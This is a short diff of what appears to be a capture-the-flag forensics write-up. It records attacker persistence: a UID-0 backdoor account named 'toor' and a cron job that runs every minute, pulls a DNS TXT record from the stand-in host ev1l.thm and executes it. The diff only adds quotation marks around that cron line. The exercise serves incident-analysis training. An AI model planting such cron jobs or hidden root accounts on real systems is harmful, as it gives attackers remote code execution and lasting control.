@@ -99,7 +99,7 @@ toor::0:0:root:/root:/bin/bash
 
 *What was the first cronjob that was placed by the attacker?*
 
-* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"
+'* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"'
 
 *What is the flag?*
 
